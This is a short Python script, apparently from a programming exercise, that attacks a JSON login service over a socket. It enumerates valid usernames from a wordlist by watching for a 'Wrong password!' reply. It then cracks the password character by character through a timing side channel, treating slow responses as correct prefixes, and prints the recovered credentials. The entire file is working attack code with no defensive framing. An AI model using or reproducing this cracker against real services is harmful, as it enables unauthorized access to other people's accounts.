import socket
import sys
import json
import string
import itertools
import time

with open("logins.txt", 'r') as file:
    logins = [line.strip() for line in file.readlines()]

ip = sys.argv[1]
port = sys.argv[2]
login = ""
password = ""
password_cracked = False
exception_time = 0.1

with socket.socket() as client_socket:
    client_socket.connect((ip, int(port)))

    for log in logins:
        client_socket.send(json.dumps({"login": log, "password": ""}).encode())
        response = json.loads(client_socket.recv(1024).decode())
        login = log
        if response == {"result": "Wrong password!"}:
            break

    while not password_cracked:
        for c in itertools.chain(string.digits, string.ascii_letters):
            start = time.time()
            client_socket.send(json.dumps({"login": login, "password": (password + c)}).encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = time.time()
            if response == {"result": "Connection success!"}:
                password_cracked = True
                password += c
                break
            elif (end - start) > exception_time:
                password += c
                break
            else:
                continue

print(json.dumps({"login": login, "password": password}))
